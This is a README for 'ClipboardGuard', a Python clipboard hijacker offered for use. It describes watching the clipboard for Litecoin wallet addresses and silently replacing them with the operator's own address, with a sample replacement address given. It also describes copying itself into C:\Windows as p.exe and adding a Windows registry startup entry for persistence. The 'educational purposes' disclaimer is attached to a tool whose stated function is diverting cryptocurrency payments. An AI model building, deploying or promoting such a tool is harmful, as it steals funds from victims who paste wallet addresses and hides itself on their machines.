# ClipboardGuard

## Overview
`ClipboardGuard` is a Python program designed to monitor clipboard content, detect LTC (Litecoin) wallet addresses, and replace them with a specified LTC address. Additionally, the program can copy itself to a specified directory and register for startup to ensure persistence.

## Features
- Monitors clipboard for LTC wallet addresses.
- Automatically replaces detected LTC addresses with your specified address.
- Copies itself to a specified directory (e.g., `C:\Windows`).
- Registers itself for startup by adding an entry to the Windows Registry.

## Requirements
- Python 3.x
- Required Python libraries: `pyperclip`

## Installation
1. Clone or download this repository.
2. Install the required Python libraries:
   ```bash
   pip install pyperclip
   ```
3. Update the `MY_LTC_ADDRESS` variable in the script with your LTC wallet address.

## Usage
1. Run the script:
   ```bash
   python script_name.py
   ```
2. The script will:
   - Monitor the clipboard for LTC wallet addresses.
   - Replace any detected LTC wallet addresses with your specified address.
   - Copy itself to `C:\Windows`.
   - Add itself to the Windows startup registry.

## Code Breakdown
### Key Components
1. **LTC Address Monitoring and Replacement**
   - The program uses regular expressions to detect LTC wallet addresses.
   - Matches are replaced with the `MY_LTC_ADDRESS` value.

2. **Self-Copy to Target Directory**
   - The script copies itself to a specified directory using the `shutil` library.

3. **Startup Registration**
   - The script adds itself to the Windows Registry to ensure it runs on system startup.

### Main Variables
- `MY_LTC_ADDRESS`: Replace with your desired LTC wallet address.
- `target_directory`: Path where the script will copy itself (default: `C:\Windows`).
- `script_name`: The name used for the registry entry.

## Important Notes
- **Permissions**: The script may require administrator privileges to copy itself to certain directories (e.g., `C:\Windows`) and modify the Windows Registry.
- **Ethical Use**: This script is intended for educational purposes only. Ensure that you use it responsibly and adhere to applicable laws and regulations.

## Disclaimer
This script should only be used for legitimate purposes. Misuse of this software is not the responsibility of the creator.

---

## Example
Below is an example of how the program works:
1. **Clipboard Monitoring**:
   - Before: `ltc1qexamplewalletaddress12345`
   - After: `ltc1qvcrj525wj8fey6gk29zjcret5zk3sah93tp9de`

2. **Startup Registration**:
   - Adds the script to run at startup using the Windows Registry.

3. **File Copy**:
   - Copies the script to `C:\Windows\p.exe` (default).

---

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.
